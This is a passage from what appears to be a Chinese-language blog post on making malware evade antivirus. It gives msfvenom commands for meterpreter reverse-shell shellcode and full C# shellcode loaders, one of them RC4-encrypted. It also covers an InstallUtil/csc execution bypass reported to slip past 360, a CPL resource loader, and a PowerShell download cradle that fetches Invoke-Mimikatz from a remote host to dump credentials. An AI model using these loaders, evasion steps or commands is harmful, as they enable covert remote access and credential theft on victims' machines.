encryptedShellcodeWrapper_xor.py</code></pre><h4 id="6-aes加密"><a href="#6-aes加密" class="headerlink" title="6.aes加密"></a>6.aes加密</h4><p>和方法五一样，只不过将<code>python shellcode_encoder.py -py shellcode.raw se_null xor</code>设置为<code>python shellcode_encoder.py -py shellcode.raw se_null aes</code>即可</p><h3 id="2-python加载器"><a href="#2-python加载器" class="headerlink" title="2.python加载器"></a>2.python加载器</h3><h4 id="1-HEX加密"><a href="#1-HEX加密" class="headerlink" title="1.HEX加密"></a>1.HEX加密</h4><p>这是使用了k8的方法：（<a href="https://www.cnblogs.com/k8gege/p/11223393.htmlk8%EF%BC%89%E7%9A%84%E5%B7%A5%E5%85%B7scrun%E4%B8%8D%E4%BB%85%E6%8F%90%E4%BE%9B%E4%BA%86%E5%8A%A0%E8%BD%BDpython%E4%BB%A3%E7%A0%81%EF%BC%8C%E8%BF%98%E8%83%BD%E5%8A%A0%E8%BD%BDC#%E3%80%82">https://www.cnblogs.com/k8gege/p/11223393.htmlk8）的工具scrun不仅提供了加载python代码，还能加载C#。</a></p><p>先用msfvenom生成一个c格式的shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.3.30 lport=3333  -f c -o shell.c</code></pre><p>用k8飞刀把shellcode转成hex,k8飞刀地址：<a href="https://github.com/k8gege/K8tools">https://github.com/k8gege/K8tools</a> （解压密码是k8gege）（encode/decode-粘贴shellcode，shellcode只需一对引号引起来-全选-右键-hacking-shellcode-chartohex）</p><p>使用<code>python ScRunHex.py hexcode</code>就可以加载执行shellcode了</p><h4 id="2-base64加密"><a href="#2-base64加密" class="headerlink" title="2.base64加密"></a>2.base64加密</h4><p>同上一样，这次使用的是k8的<code>ScRunBase64.py</code></p><h2 id="3-c-（查杀概率仍然比较大）"><a href="#3-c-（查杀概率仍然比较大）" class="headerlink" title="3.c#（查杀概率仍然比较大）"></a>3.c#（查杀概率仍然比较大）</h2><p><a href="https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog">https://mp.weixin.qq.com/s/Kvhfb13d2_D6m-Bu9Darog</a></p><h3 id="1-C-源码直接编译exe"><a href="#1-C-源码直接编译exe" class="headerlink" title="1.C#源码直接编译exe"></a>1.C#源码直接编译exe</h3><h4 id="1-C-shellcode直接编译（VT-16-69-过360）"><a href="#1-C-shellcode直接编译（VT-16-69-过360）" class="headerlink" title="1.C#+shellcode直接编译（VT:16/69 过360）"></a>1.C#+shellcode直接编译（VT:16/69 过360）</h4><p>先用msfvenom生成基于C#的shellcode,使用了<code>shikata_ga_nai</code>编码    </p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.30 LPORT=3333 -e x86/shikata_ga_nai  -i 15  -f csharp -o payload.txt</code></pre><p>然后将<code>payload.txt</code>文件中的shellcode代码复制到下面C#代码中</p><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<span class="hljs-keyword">using</span> System.Runtime.InteropServices;<span class="hljs-keyword">namespace</span> <span class="hljs-title">TCPMeterpreterProcess</span>&#123;    <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>    &#123;        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[] args</span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-comment">// native function’s compiled code</span>            <span class="hljs-comment">// generated with metasploit</span>            <span class="hljs-keyword">byte</span>[] shellcode = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[] &#123; msfvenom生成的 shellcode&#125;;                        UInt32 funcAddr = VirtualAlloc(<span class="hljs-number">0</span>, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);Marshal.Copy(shellcode, <span class="hljs-number">0</span>, (IntPtr)(funcAddr), shellcode.Length);IntPtr hThread = IntPtr.Zero;UInt32 threadId = <span class="hljs-number">0</span>;<span class="hljs-comment">// prepare data</span>IntPtr pinfo = IntPtr.Zero;<span class="hljs-comment">// execute native code</span>hThread = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, funcAddr, pinfo, <span class="hljs-number">0</span>, <span class="hljs-keyword">ref</span> threadId);WaitForSingleObject(hThread, <span class="hljs-number">0xFFFFFFFF</span>);&#125;        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 MEM_COMMIT = <span class="hljs-number">0x1000</span>;<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="hljs-number">0x40</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">UInt32 lpStartAddr,</span></span><span class="hljs-function"><span class="hljs-params">UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">VirtualFree</span>(<span class="hljs-params">IntPtr lpAddress,</span></span><span class="hljs-function"><span class="hljs-params">UInt32 dwSize, UInt32 dwFreeType</span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">UInt32 lpThreadAttributes,</span></span><span class="hljs-function"><span class="hljs-params">UInt32 dwStackSize,</span></span><span class="hljs-function"><span class="hljs-params">UInt32 lpStartAddress,</span></span><span class="hljs-function"><span class="hljs-params">IntPtr param,</span></span><span class="hljs-function"><span class="hljs-params">UInt32 dwCreationFlags,</span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">ref</span> UInt32 lpThreadId</span></span><span class="hljs-function"><span class="hljs-params"></span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">CloseHandle</span>(<span class="hljs-params">IntPtr handle</span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">WaitForSingleObject</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">IntPtr hHandle,</span></span><span class="hljs-function"><span class="hljs-params">UInt32 dwMilliseconds</span></span><span class="hljs-function"><span class="hljs-params"></span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">GetModuleHandle</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span> moduleName</span></span><span class="hljs-function"><span class="hljs-params"></span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">GetProcAddress</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">IntPtr hModule,</span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span> procName</span></span><span class="hljs-function"><span class="hljs-params"></span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">LoadLibrary</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span> lpFileName</span></span><span class="hljs-function"><span class="hljs-params"></span>)</span>;[<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> UInt32 <span class="hljs-title">GetLastError</span>(<span class="hljs-params"></span>)</span>;&#125;&#125;</code></pre><p>在vs2019中新建C#项目(选择控制台应用(.NET Framwork)),编译运行</p><p>msf开启监听，正常执行生成的exe。</p><h4 id="2-C-加密处理shellcode免杀"><a href="#2-C-加密处理shellcode免杀" class="headerlink" title="2.C#+加密处理shellcode免杀"></a>2.C#+加密处理shellcode免杀</h4><p>先用msf生成基于c#的shellcode</p><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.30 LPORT=3333 -f csharp -o payload.txt</code></pre><p>把上面<code>payload.txt</code>中的c#代码放入下面的加密代码中</p><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<span class="hljs-keyword">using</span> System.Collections.Generic;<span class="hljs-keyword">using</span> System.IO;<span class="hljs-keyword">using</span> System.Linq;<span class="hljs-keyword">using</span> System.Security.Cryptography;<span class="hljs-keyword">using</span> System.Text;<span class="hljs-keyword">using</span> System.Threading.Tasks;<span class="hljs-keyword">using</span> System.Reflection;<span class="hljs-keyword">using</span> System.Runtime.CompilerServices;<span class="hljs-keyword">using</span> System.Runtime.InteropServices;<span class="hljs-keyword">namespace</span> <span class="hljs-title">Payload_Encrypt_Maker</span>&#123; <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>    &#123;           <span class="hljs-comment">// 加密密钥，可以更改，加解密源码中保持KEY一致就行</span>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] KEY = &#123; <span class="hljs-number">0x11</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;        <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] IV = &#123; <span class="hljs-number">0x00</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xcc</span> &#125;;        <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] payload =&#123;<span class="hljs-number">0x6b</span>,<span class="hljs-number">0xa9</span>&#125;;    <span class="hljs-comment">// 替换成MSF生成的shellcode</span>              <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Encryption_Class</span>        &#123;            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">string</span> <span class="hljs-title">Encrypt</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> key, <span class="hljs-keyword">string</span> data</span>)</span><span class="hljs-function"></span>            &#123;                Encoding unicode = Encoding.Unicode;                <span class="hljs-keyword">return</span> Convert.ToBase64String(Encrypt(unicode.GetBytes(key), unicode.GetBytes(data)));            &#125;                        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">Encrypt</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, <span class="hljs-keyword">byte</span>[] data</span>)</span><span class="hljs-function"></span>            &#123;                <span class="hljs-keyword">return</span> EncryptOutput(key, data).ToArray();            &#125;                       <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">EncryptInitalize</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key</span>)</span><span class="hljs-function"></span>            &#123;                <span class="hljs-keyword">byte</span>[] s = Enumerable.Range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>)                  .Select(i =&gt; (<span class="hljs-keyword">byte</span>)i)                  .ToArray();                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)                &#123;                    j = (j + key[i % key.Length] + s[i]) &amp; <span class="hljs-number">255</span>;                    Swap(s, i, j);                &#125;                <span class="hljs-keyword">return</span> s;            &#125;            <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; <span class="hljs-title">EncryptOutput</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; data</span>)</span><span class="hljs-function"></span>            &#123;                <span class="hljs-keyword">byte</span>[] s = EncryptInitalize(key);                <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;                <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;                <span class="hljs-keyword">return</span> data.Select((b) =&gt;                &#123;                    i = (i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">255</span>;                    j = (j + s[i]) &amp; <span class="hljs-number">255</span>;                    Swap(s, i, j);                    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="hljs-number">255</span>]);                &#125;);            &#125;            <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] s, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j</span>)</span><span class="hljs-function"></span>            &#123;                <span class="hljs-keyword">byte</span> c = s[i];                s[i] = s[j];                s[j] = c;            &#125;        &#125;        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[] args</span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-keyword">byte</span>[] result = Encryption_Class.Encrypt(KEY, payload);            <span class="hljs-keyword">int</span> b = <span class="hljs-number">0</span>;            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; result.Length; i++)            &#123;   b++;                <span class="hljs-keyword">if</span> (i == result.Length+<span class="hljs-number">1</span>)                &#123;Console.Write(result[i].ToString());&#125;                <span class="hljs-keyword">if</span> (i != result.Length) &#123; Console.Write(result[i].ToString() + <span class="hljs-string">&quot;,&quot;</span>); &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>编译生成一段加密后的shellcode,要查看这段shellcode，直接到生成的exe目录下打开cmd，输入exe文件名即可查看。</p><p>在vs2017中再新建C#解密项目</p><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<span class="hljs-keyword">using</span> System.Collections.Generic;<span class="hljs-keyword">using</span> System.Linq;<span class="hljs-keyword">using</span> System.Text;<span class="hljs-keyword">using</span> System.Runtime.InteropServices;<span class="hljs-keyword">using</span> System.Threading;<span class="hljs-keyword">using</span> System.Reflection;<span class="hljs-keyword">using</span> System.Runtime.CompilerServices;<span class="hljs-keyword">namespace</span> <span class="hljs-title">NativePayload_Reverse_tcp</span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>    &#123;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>        &#123;            Shellcode.Exec();        &#125;    &#125;    <span class="hljs-keyword">class</span> <span class="hljs-title">Shellcode</span>    &#123;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Exec</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-keyword">string</span> Payload_Encrypted;            Payload_Encrypted = <span class="hljs-string">&quot;0,244,36,163,code_herer&quot;</span>;            <span class="hljs-keyword">string</span>[] Payload_Encrypted_Without_delimiterChar = Payload_Encrypted.Split(<span class="hljs-string">&#x27;,&#x27;</span>);            <span class="hljs-keyword">byte</span>[] _X_to_Bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[Payload_Encrypted_Without_delimiterChar.Length];            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; Payload_Encrypted_Without_delimiterChar.Length; i++)            &#123;                <span class="hljs-keyword">byte</span> current = Convert.ToByte(Payload_Encrypted_Without_delimiterChar[i].ToString());                _X_to_Bytes[i] = current;            &#125;            <span class="hljs-comment">// 解密密钥，可以更改，加解密源码中保持KEY一致就行</span>            <span class="hljs-keyword">byte</span>[] KEY = &#123; <span class="hljs-number">0x11</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span> &#125;;            <span class="hljs-keyword">byte</span>[] MsfPayload = Decrypt(KEY, _X_to_Bytes);            <span class="hljs-comment">// 加载shellcode</span>            IntPtr returnAddr = VirtualAlloc((IntPtr)<span class="hljs-number">0</span>, (<span class="hljs-keyword">uint</span>)Math.Max(MsfPayload.Length, <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>);            Marshal.Copy(MsfPayload, <span class="hljs-number">0</span>, returnAddr, MsfPayload.Length);            CreateThread((IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, returnAddr, (IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (IntPtr)<span class="hljs-number">0</span>);            Thread.Sleep(<span class="hljs-number">2000</span>);        &#125;        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">Decrypt</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, <span class="hljs-keyword">byte</span>[] data</span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-keyword">return</span> EncryptOutput(key, data).ToArray();        &#125;        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] <span class="hljs-title">EncryptInitalize</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key</span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-keyword">byte</span>[] s = Enumerable.Range(<span class="hljs-number">0</span>, <span class="hljs-number">256</span>)              .Select(i =&gt; (<span class="hljs-keyword">byte</span>)i)              .ToArray();            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)            &#123;                j = (j + key[i % key.Length] + s[i]) &amp; <span class="hljs-number">255</span>;                Swap(s, i, j);            &#125;            <span class="hljs-keyword">return</span> s;        &#125;        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; <span class="hljs-title">EncryptOutput</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] key, IEnumerable&lt;<span class="hljs-keyword">byte</span>&gt; data</span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-keyword">byte</span>[] s = EncryptInitalize(key);            <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;            <span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>;            <span class="hljs-keyword">return</span> data.Select((b) =&gt;            &#123;                i = (i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">255</span>;                j = (j + s[i]) &amp; <span class="hljs-number">255</span>;                Swap(s, i, j);                <span class="hljs-keyword">return</span> (<span class="hljs-keyword">byte</span>)(b ^ s[(s[i] + s[j]) &amp; <span class="hljs-number">255</span>]);            &#125;);        &#125;        <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Swap</span>(<span class="hljs-params"><span class="hljs-keyword">byte</span>[] s, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j</span>)</span><span class="hljs-function"></span>        &#123;            <span class="hljs-keyword">byte</span> c = s[i];            s[i] = s[j];            s[j] = c;        &#125;        [<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAlloc</span>(<span class="hljs-params">IntPtr lpAddress, <span class="hljs-keyword">uint</span> dwSize, <span class="hljs-keyword">uint</span> flAllocationType, <span class="hljs-keyword">uint</span> flProtect</span>)</span>;        [<span class="hljs-meta">DllImport(<span class="hljs-meta-string">&quot;kernel32.dll&quot;</span>)</span>]        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span>(<span class="hljs-params">IntPtr lpThreadAttributes, <span class="hljs-keyword">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="hljs-keyword">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;    &#125;&#125;</code></pre><p>执行生成的exe,msf正常上线</p><h4 id="3-XOR-AES编码shellcode"><a href="#3-XOR-AES编码shellcode" class="headerlink" title="3.XOR/AES编码shellcode"></a>3.XOR/AES编码shellcode</h4><p>先用msfvenom生成一个raw格式的shellcode</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 6 -b &#x27;\x00&#x27; lhost=192.168.43.30 lport=3333  -f raw &gt; shellcode.raw</code></pre><p>在<code>ShellcodeWrapper</code>文件夹中执行下面命令，其中<code>se_null</code>为自己设置的key。</p><pre><code class="hljs shell">python shellcode_encoder.py -cs shellcode.raw se_null xor</code></pre><p>生成的<code>encryptedShellcodeWrapper_xor.cs</code>文件中的C#源码放在vs2019中编译运行即可。</p><h3 id="2-加载器加载C-代码"><a href="#2-加载器加载C-代码" class="headerlink" title="2.加载器加载C#代码"></a>2.加载器加载C#代码</h3><h4 id="1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）"><a href="#1-使用CSC-InstallUtil执行shellcode（VT-37-71-shell-exe不能过360）" class="headerlink" title="1.使用CSC+InstallUtil执行shellcode（VT:37/71  shell.exe不能过360）"></a>1.使用CSC+InstallUtil执行shellcode（VT:37/71  shell.exe不能过360）</h4><p>先通过msfvenom生成C＃的shellcode</p><pre><code class="hljs c#">msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i <span class="hljs-number">6</span> -b <span class="hljs-string">&#x27;\x00&#x27;</span> lhost=<span class="hljs-number">192.168</span><span class="hljs-number">.43</span><span class="hljs-number">.30</span> lport=<span class="hljs-number">3333</span> -f csharp</code></pre><p>下载InstallUtil-Shellcode.cs</p><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//</span>raw.githubusercontent.com<span class="hljs-regexp">/TideSec/</span>BypassAntiVirus<span class="hljs-regexp">/master/</span>tools/InstallUtil-Shellcode.cs</code></pre><p>将上面生成的shellcode复制到<code>InstallUtil-Shellcode.cs</code>文件中。</p><p>使用csc(以下.NET版本不是唯一可以执行的)编译InstallUtil-ShellCode.cs</p><pre><code class="hljs latex">C:<span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span>.NET<span class="hljs-tag">\<span class="hljs-name">Framework</span></span><span class="hljs-tag">\<span class="hljs-name">v</span></span>4.0.30319<span class="hljs-tag">\<span class="hljs-name">csc</span></span>.exe /unsafe /platform:x86 /out:C:<span class="hljs-tag">\<span class="hljs-name">test</span></span><span class="hljs-tag">\<span class="hljs-name">shell</span></span>.exe C:<span class="hljs-tag">\<span class="hljs-name">test</span></span><span class="hljs-tag">\<span class="hljs-name">InstallUtil</span></span>-ShellCode.cs</code></pre><p>编译生成的shell.exe直接执行是不行的，需要使用InstallUtil.exe来触发。</p><p>使用InstallUtil.exe执行shell.exe，360安全卫士会检测到InstallUtil.exe执行预警，360杀毒和火绒动态和静态均无预警。</p><pre><code class="hljs shell">C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\test\shell.exe</code></pre><h4 id="2-从资源里加载shelllcode"><a href="#2-从资源里加载shelllcode" class="headerlink" title="2.从资源里加载shelllcode"></a>2.从资源里加载shelllcode</h4><p>这里只介绍另外一种从资源里加载shelllcode的方法，不过很遗憾的是这个我没有复现成功。</p><p>参考自三好学生大佬的文章:<code>https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</code></p><p>需要用到这个工具<code>https://github.com/rvrsh3ll/CPLResourceRunner</code></p><p>先用Cobalt Strike 生成shellcode</p><pre><code class="hljs shell">Attacks -&gt; Packages -&gt; Windows Executable (s) -&gt; Output =&gt; RAW (x86)</code></pre><p>然后用<code>ConvertShellcode.py</code>将生成的<code>beacon.bin</code>转换成<code>shellcode.txt</code></p><pre><code class="hljs shell">python ConvertShellcode.py beacon.bin</code></pre><p>然后再转换成base64编码。</p><pre><code class="hljs shell">cat shellcode.txt |sed &#x27;s/[, ]//g; s/0x//g;&#x27; |tr -d &#x27;\n&#x27; |xxd -p -r |gzip -c |base64 &gt; b64shellcode.txt</code></pre><p>把生成的base64编码的shellcode复制到项目资源<code>CPLResourceRunner/Resources.txt</code>里。</p><p>编译生成dll，并将生成的<code>CPLResourceRunner.dll</code>重命名为<code>.cpl</code>文件，之后执行即可</p><p>不过经过测试，无法上线，没找出来具体原因。</p><p>msf生成spl木马</p><pre><code class="hljs shell">msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.43.30 lport=3333  -f dll  &gt; shellcode.cpl</code></pre><p>执行：</p><p>(1) 双击直接运行</p><p>(2) cmd下输入<code>rundll32 shell32.dll,Control_RunDLL &lt;文件名&gt;</code></p><p>(3) cmd下输入<code>control &lt;文件名&gt;</code></p><h2 id="4-powershell"><a href="#4-powershell" class="headerlink" title="4.powershell"></a>4.powershell</h2><p><a href="https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ">https://mp.weixin.qq.com/s/Tw-FAduHMVzek_YxIErQDQ</a></p><h3 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1.基础知识"></a>1.基础知识</h3><h4 id="1-powershell版本问题"><a href="#1-powershell版本问题" class="headerlink" title="1.powershell版本问题"></a>1.powershell版本问题</h4><p>powershell只能针对win7之后的系统，之前的win操作系统默认没有安装powershell。不同架构的payload（x86或x64）需要不同版本的powershell来加载，否则会出错。</p><p>64位所在目录：<code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></p><p>32位所在目录：<code>C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe</code></p><h4 id="2-常见执行方式"><a href="#2-常见执行方式" class="headerlink" title="2.常见执行方式"></a>2.常见执行方式</h4><p><strong>网络环境直接执行代码</strong></p><p>无文件写入，相对较为隐蔽。下面代码为加载远程脚本<code>Invoke-Mimikatz.ps1</code>，执行Mimikatz的DumpCreds功能。</p><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.211.55.2/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz -DumpCreds&quot;</span></code></pre><p><strong>本地执行</strong></p><p>先把<code>[http://10.211.55.2/Invoke-Mimikatz.ps1](http://10.211.55.2/Invoke-Mimikatz.ps1)</code>下载到本地</p><p>然后导入<code>powershell Import-Module .\Invoke-Mimikatz.ps1</code></p><p>使用命令<code>Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; 